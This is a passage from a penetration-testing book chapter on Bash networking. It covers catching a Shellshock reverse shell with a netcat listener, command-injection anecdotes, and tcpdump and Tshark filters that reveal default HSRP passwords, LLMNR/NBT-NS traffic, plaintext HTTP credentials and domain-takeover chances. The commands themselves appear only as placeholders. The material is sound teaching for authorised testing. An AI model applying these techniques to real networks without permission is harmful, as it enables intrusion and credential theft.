  type: TYPE_NORMAL
- en: '**l** : listen for inbound connections'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '**v** : verbose'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: '**p 4444** : local port number for listener'
  prefs:
  - PREF_IND
  - PREF_UL
  type: TYPE_NORMAL
- en: Tip
  prefs: []
  type: TYPE_NORMAL
- en: Netcat can create almost any kind of connection you need, acting as either a
    client or a server. It’s commonly used for port scanning, transferring files,
    port listening, and even as a backdoor in pentest ing.
  prefs: []
  type: TYPE_NORMAL
- en: In one terminal, I execute the Netcat command. Then, in a second terminal window,
    I execute the exploit. In the terminal where I ran the Netcat command, we see
    the connection established from **10.2.10.1** . Finally, I enter the **id** command
    to see the user that owns this shell ( **www-data** ).
  prefs: []
  type: TYPE_NORMAL
- en: You can experiment with this for yourself by downloading and running **vulhub**
    ( [https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub) ) configured
    to run **bash/CVE-2014-6271** .
  prefs: []
  type: TYPE_NORMAL
- en: Tip
  prefs: []
  type: TYPE_NORMAL
- en: When I’m performing pentests, I’m always on the lookout for web application
    functions that are likely to pass user-supplied input to an operating system command.
    These functions are frequently found in diagnostics testing, such as when web
    appliances have a ping or traceroute command on the diagnostics page. I also pay
    attention to any parameters that look like they could logically be performing
    an operating system command.
  prefs: []
  type: TYPE_NORMAL
- en: Back in 2016, I discovered two critical severity vulnerabilities in the web
    interface of a Western Digital MyCloud **Network Attached Storage** ( **NAS**
    ) device ( [https://web.archive.org/web/20170119123248/https://stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/](https://web.archive.org/web/20170119123248/https://stevencampbell.info/2016/12/command-injection-in-western-digital-mycloud-nas/)
    ). The detail that caught my attention was seeing a parameter named **cmd** in
    the HTTP request data. Upon exploring further, I found that the **username** parameter
    in the cookie header and the **cmd arg** parameter in the request body were not
    properly filtering user input before passing the data to commands in the Bash
    shell. Exploiting these vulnerabilities allowed me to execute commands as the
    *root* user without authentication.
  prefs: []
  type: TYPE_NORMAL
- en: During a customer pentest in 2023, I found a command injection vulnerability
    in a web application that passed user input to the ping command. After gaining
    access to the administrative interface of a web application due to default credentials,
    I quickly located the diagnostics page. The application filtered most of the characters
    required for shell command injection but overlooked shell expansion characters.
    Eventually, I found that you could send a request to the vulnerable endpoint without
    including any authentication credentials. While the application response would
    redirect you back to the login page, the response still contained the output of
    the Bash command. This resulted in an unauthenticated command injection as the
    root user.
  prefs: []
  type: TYPE_NORMAL
- en: In this section, I’ve provided you with merely a taste of network exploitation
    in Bash. Later chapters will explore more exploitation techniques, as well as
    dive into post-exploitation commands in Bash. Next up, we’ll be taking a look
    at using Bash for network traffic analysis.
  prefs: []
  type: TYPE_NORMAL
- en: Network traffic analysis
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this section, we’ll be exploring commands in the Bash shell to capture and
    analyze network traffic.
  prefs: []
  type: TYPE_NORMAL
- en: Before I jumped into pentesting, I worked in various IT jobs. At one point,
    I earned the **Cisco Certified Network Associate** ( **CCNA** ) certification.
    The things I learned about networking and packet captures have been valuable in
    my pentest ing career.
  prefs: []
  type: TYPE_NORMAL
- en: There will be times in your pentesting career when you’ll be faced with testing
    systems that have been repeatedly scanned and tested by others before you. At
    some point in time, you’ll either feel like you’re not good enough and question
    your ability, or think that there are no vulnerabilities present. When this happens,
    you’ll be forced to dig deeper and think outside the box to uncover vulnerabilities
    that others have overlooked. Understanding networking at a deeper level can frequently
    be the key to uncovering these vulnerabilities.
  prefs: []
  type: TYPE_NORMAL
- en: Capturing and analyzing network traffic
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: One of the first steps I perform at the beginning of an internal network pentest
    is running a packet capture using the **tcpdump** command. **tcpdump** is a command-line
    packet analyzer for Unix-like operating systems. It allows users to capture and
    display the contents of network packets in real time.
  prefs: []
  type: TYPE_NORMAL
- en: 'I use this command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE23]'
  prefs: []
  type: TYPE_PRE
- en: Let this run for five minutes, then press the *Ctrl* + *C* key combination to
    stop the capture.
  prefs: []
  type: TYPE_NORMAL
- en: 'Here’s the explanation:'
  prefs: []
  type: TYPE_NORMAL
- en: '**sudo** : The following command requires root privileges. The **sudo** command
    elevates the privileges of the current user.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**tcpdump** : **tcpdump** prints out a description of the contents of packets
    on a network interface.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**-i eth0** : This is the **tcpdump** argument to specify the network interface.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**-w packetcapture.pcap** : This is the **tcpdump** argument to write the data
    to a file.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Next, I use various **tcpdump** commands to search for interesting data in the
    capture. Once such command is used to detect a default **Hot Standby Router Protocol**
    ( **HSRP** ) password of *cisco* . This **tcpdump** filter checks for the default
    password ( **cisco** ) in the HSRP in the packet capture file. HSRP allows the
    configuration of multiple physical routers into a single logical unit with a shared
    IP address. HSRP attacks involve forcibly taking over the active router’s role
    by injecting a maximum priority value. This can lead to a **Man-In-The-Middle**
    ( **MITM** ) attack. If the system is discovered to be using the default password
    ( **cisco** ), this could lead to someone becoming the router and capturing traffic
    containing sensitive data.
  prefs: []
  type: TYPE_NORMAL
- en: You can follow along with this exercise by downloading the **HSRP_election.cap**
    file from the book’s GitHub repository.
  prefs: []
  type: TYPE_NORMAL
- en: 'The following command demonstrates how to parse a packet capture file using
    the **tcpdump** command to discover the Cisco HSRP default password in use:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE24]'
  prefs: []
  type: TYPE_PRE
- en: 'Here’s the output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.11 – The output of the tcpdump command to display HSRP credentials](image/B22229_06_11.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.11 – The output of the tcpdump command to display HSRP credentials
  prefs: []
  type: TYPE_NORMAL
- en: In this example, we don’t need to preface the **tcpdump** command with **sudo**
    because we’re reading from a capture file.
  prefs: []
  type: TYPE_NORMAL
- en: 'Here’s the rest of the explanation:'
  prefs: []
  type: TYPE_NORMAL
- en: '**-XX** : This is a command to print the data of each packet, including its
    link level header, in hex and ASCII.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**-r packetcapture.pcap** : This is a command to read from the packet capture
    file.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**udp port 1985 or udp port 2029** : This is a filter to display only records
    with the included source or destination port.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**| grep -B4 cisco** : We pipe the output of the **tcpdump** command to **grep**
    , searching for the word *cisco* . The **-B4** option prints the matched line
    plus four lines before the match. If you want to print lines after the match,
    use **-An** , where **n** is the number of lines.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Important note
  prefs: []
  type: TYPE_NORMAL
- en: Unless you’re onsite sitting at the keyboard of the system that’s running the
    commands, never attempt to perform an MITM attack on HSRP or other network routing
    protocols. If the attack goes awry, you may lose access to your attack system
    and be unable to stop the attack. The resulting network outage will make people
    very unhappy! It is usually best to simply report this vulnerability and move
    on because exploiting it risks causing an outage if you make a mistake.
  prefs: []
  type: TYPE_NORMAL
- en: Other common network protocols that are commonly hacked are **Link Local Multicast
    Name Resolution** ( **LLMNR** ) and **NetBIOS Name Service** ( **NBT-NS** ). You
    may believe that when you type a domain name such as **google.com** into the web
    browser, command line, or Explorer, a DNS server resolves the name to an IP address.
    However, the Microsoft Windows operating system will use LLMNR and NBT-NS to attempt
    to locate the hostname on the local network if DNS resolution fails. Since these
    are broadcast protocols and are sent to all hosts, they can be poisoned and potentially
    exploited. This scenario happens frequently inside enterprise networks due to
    software installation or configuration artifacts that have been left behind on
    systems once the host the software connects to has been decommissioned. Just recently
    I captured plaintext SQL server credentials on a pentest because a host was repeatedly
    attempting to connect to a server that no longer existed and therefore could not
    be resolved by DNS.
  prefs: []
  type: TYPE_NORMAL
- en: 'The **tcpdump** command I use to detect LLMNR and NBT-NS is as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE25]'
  prefs: []
  type: TYPE_PRE
- en: This replays the **packetcapture.pcap** file, filtering for any traffic to or
    from UDP ports **137** and **5355** . If anything is detected by this filter,
    you may be able to capture password hashes or relay the connections. These protocols
    are trivial to hack during internal network pentests. We’ll cover this exercise
    in depth later in [*Chapter 10*](B22229_10.xhtml#_idTextAnchor260) .
  prefs: []
  type: TYPE_NORMAL
- en: The following example captures credentials sent over plaintext HTTP. You should
    always provide proof of concept exploits in your pentest report findings whenever
    possible. For example, when you report a finding of plaintext services such as
    HTTP or FTP, providing a screenshot showing how the credentials can be captured
    shows the system owner why it’s bad to use plaintext services.
  prefs: []
  type: TYPE_NORMAL
- en: 'In your terminal, run the following command to filter for plaintext HTTP communication:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE26]'
  prefs: []
  type: TYPE_PRE
- en: 'The following figure shows the pentester capturing the plaintext credentials
    in the command output:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.12 – Capturing the plaintext credentials in HTTP communication](image/B22229_06_12.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.12 – Capturing the plaintext credentials in HTTP communication
  prefs: []
  type: TYPE_NORMAL
- en: Another packet capture tool I frequently use is Tshark. Tshark is a powerful
    command-line network protocol analyzer that comes bundled with the popular Wireshark
    **graphical user interface** ( **GUI** ) network protocol analyzer. While Wireshark
    provides a user-friendly interface for capturing and analyzing network traffic,
    Tshark allows you to perform similar tasks from the command line. Tshark allows
    you to use more complex capture filters than those provided by Tcpdump.
  prefs: []
  type: TYPE_NORMAL
- en: 'If Tshark is not already installed on your system, you can get it by installing
    Wireshark. If you want to use Tshark on a headless system, you can install it
    without installing the Wireshark GUI on Kali using the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE27]'
  prefs: []
  type: TYPE_PRE
- en: One of my use cases for Tshark is when I’m performing a web application pentest.
    The whole time I’m testing the website, I have Tshark running in my terminal.
    This allows me to discover domain takeover vulnerabilities. Imagine for a moment
    that the web developers once used a third-party web service to integrate content
    into the website. Somewhere along the way, they may have let that third-party
    domain go or let the domain name expire. If you can register that domain name,
    it may result in the ability to inject content into the web application.
  prefs: []
  type: TYPE_NORMAL
- en: 'Here’s a real-world example of a hacker using this for a bug bounty:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.13 – A bug bounty hunter discovers a domain takeover opportunity](image/B22229_06_13.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.13 – A bug bounty hunter discovers a domain takeover opportunity
  prefs: []
  type: TYPE_NORMAL
- en: 'The following command will alert you to potential domain name takeovers:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE28]'
  prefs: []
  type: TYPE_PRE
- en: 'The following figure shows what you will see when a domain name can’t be resolved
    by your DNS server:'
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 6.14 – Example output shows a possible domain takeover opportunity](image/B22229_06_14.jpg)'
  prefs: []
  type: TYPE_IMG
- en: Figure 6.14 – Example output shows a possible domain takeover opportunity
  prefs: []
  type: TYPE_NORMAL
- en: If I find this output in my console during my web application pentest, I attempt
    to locate the resource in the application where this domain is being called by
    searching my proxy history. Once I find the resource that’s calling the domain,
    I investigate further to determine whether I can register the domain name and
    then determine the impact on the application. This is a possible domain takeover
    opportunity.
  prefs: []
  type: TYPE_NORMAL
- en: Having explored an introduction to capturing and analyzing network traffic,
    let’s move into the next section and dive deeper into packet captures.
  prefs: []
  type: TYPE_NORMAL
- en: Interpreting packet captures
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Tshark fields allow you to specify which specific pieces of information you
    want to extract and display from the captured packets. By using fields, you can
    focus on the relevant data and filter out the noise, making it easier to analyze
    and interpret the network traffic. There are two basic ways to use fields: display
    ( **-e** ) and filter ( **-Y** ) fields. Display fields specify what you want
    to display in the output. Filter fields provide a way to filter for traffic that
    matches a pattern.'
  prefs: []
  type: TYPE_NORMAL
- en: 'The following should simplify the difference between display and filter fields:'
  prefs: []
  type: TYPE_NORMAL
- en: '**-e** extracts specific fields from packet dissection'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**-Y** applies a display filter to packets'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**-e** selects what to display, **-Y** filters what’s displayed'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**-e** is used for the output format, **-Y** for conditional filtering'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'Use both to extract filtered fields: **-Y "http.request" -** **e http.host**'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'For example, to display only the source and destination IP addresses of each
    packet, you would use the following command:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE29]'
  prefs: []
  type: TYPE_PRE
- en: 'To apply a filter based on a field value, you can use the **-Y** or **--display-filter**
    option followed by the filter expression. For example, to display only HTTP traffic,
    you can use the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE30]'
  prefs: []
  type: TYPE_PRE
- en: 'You can combine field filters with logical operators such as **and** , **or**
    , and **not** to create more complex filter expressions. For example, to display
    only HTTP traffic originating from a specific IP address, you can use the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE31]'
  prefs: []
  type: TYPE_PRE
- en: 'There are hundreds of fields available in Tshark across all the different protocols
    it understands. However, as a cybersecurity professional, you’ll find yourself
    using a core set of fields most of the time. Here are the Tshark fields I’ve used
    most often in my work:'
  prefs: []
  type: TYPE_NORMAL
- en: '**ip.src** : The source IP address'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**ip.dst** : The destination IP address'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**ip.proto** : The IP protocol (TCP, UDP, ICMP, etc.)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**tcp.srcport** : The TCP source port'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**tcp.dstport** : The TCP destination port'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**udp.srcport** : The UDP source port'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**udp.dstport** : The UDP destination port'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**frame.time** : The timestamp of when the packet was captured'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**http.request.method** : The HTTP request method ( **GET** , **POST** , etc.)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**http.request.uri** : The URI of the HTTP request'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**http.user_agent** : The User-Agent string of the HTTP client'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**http.host** : The Host header of the HTTP request'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**dns.qry.name** : The hostname queried in a DNS request'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**dns.resp.name** : The hostname returned in a DNS response'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**dns.resp.type** : The query type of a DNS response ( **A** , **AAAA** , **CNAME**
    , etc.)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The source and destination IP address fields ( **ip.src** / **dst** ) are useful
    for identifying the endpoints involved in the communication. You can quickly spot
    suspicious IPs or track conversations between hosts.
  prefs: []
  type: TYPE_NORMAL
- en: The IP protocol field ( **ip.proto** ) tells you whether the traffic is TCP,
    UDP, ICMP, or something else. This helps categorize the traffic at a high level.
  prefs: []
  type: TYPE_NORMAL
- en: The source and destination port fields ( **tcp.srcport** , **udp.dstport** ,
    etc.) identify the network service being used, such as HTTP on port **80** , HTTPS
    on **443** , DNS on **53** , and so on. Monitoring these can reveal unauthorized
    services on your network.
  prefs: []
  type: TYPE_NORMAL
- en: The **frame.time** field adds a timestamp to each packet, which is critical
    for analyzing the sequence of events and spotting things such as replay attacks
    or password guessing.
  prefs: []
  type: TYPE_NORMAL
- en: For investigating web traffic, the HTTP method, URI, user agent, and host fields
    provide insight into potentially malicious requests, vulnerable web apps, malware
    C2 traffic, and more.
  prefs: []
  type: TYPE_NORMAL
- en: Finally, the DNS query and response fields are invaluable for incident response
    and threat hunting, allowing you to track domain lookups that could be associated
    with malware or data exfiltration.
  prefs: []
  type: TYPE_NORMAL
- en: There are many other useful fields, but these are the ones I lean on the most.
    Combine them with Tshark’s powerful filtering capabilities and you have an indispensable
    tool for inspecting suspicious traffic, investigating incidents, and hunting for
    threats.
  prefs: []
  type: TYPE_NORMAL
- en: Mastering Tshark takes practice, but it’s well worth the effort. Being able
    to quickly parse out relevant details from raw network traffic is a core skill
    for cybersecurity analysts and pentesters. Knowing your way around these common
    fields is a great start. From there, you can dig into more advanced protocol-specific
    fields as needed.
  prefs: []
  type: TYPE_NORMAL
- en: The nice thing about Tshark is that it’s extremely flexible; if there’s a field
    you need, chances are, Tshark can extract it. Don’t be afraid to explore the full
    list of fields ( **tshark -G fields** ) and experiment. Over time, you’ll build
    up your own toolkit of go-to fields and filters that will make you a faster, more
    effective analyst. Once you’ve become fluent in using Tshark fields, combine them
    with what you’ve learned about Bash scripting to automate the repetitive, boring
    stuff and supercharge your career.
  prefs: []
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, you learned how to leverage Bash to configure, troubleshoot,
    and exploit networking in Unix/Linux environments. You now have the skills to
    access network configuration details, interact with various network components,
    and use Bash scripting to exploit vulnerable network services.
  prefs: []
  type: TYPE_NORMAL
- en: You started with the networking basics, learning how to identify network configuration
    details and perform network diagnostics using Bash commands. Then you progressed
    to scripting network enumeration, automating tools to scan networks and enumerate
    services. Next, you explored how Bash can be used for network exploitation, crafting
    scripts to target vulnerabilities. Finally, you got an introduction to analyzing
    network traffic directly in Bash to extract useful information.
  prefs: []
  type: TYPE_NORMAL
- en: With the knowledge gained in this chapter, you’re now equipped to write powerful
    Bash scripts for a wide range of networking tasks, from basic administration to
    advanced pentest. The skills learned will serve you well whether securing your
    own networks or testing those of others.
  prefs: []
  type: TYPE_NORMAL
- en: In the next chapter, we’ll explore parallel processing to speed up time-sensitive
    Bash scripts.
  prefs: []
  type: TYPE_NORMAL
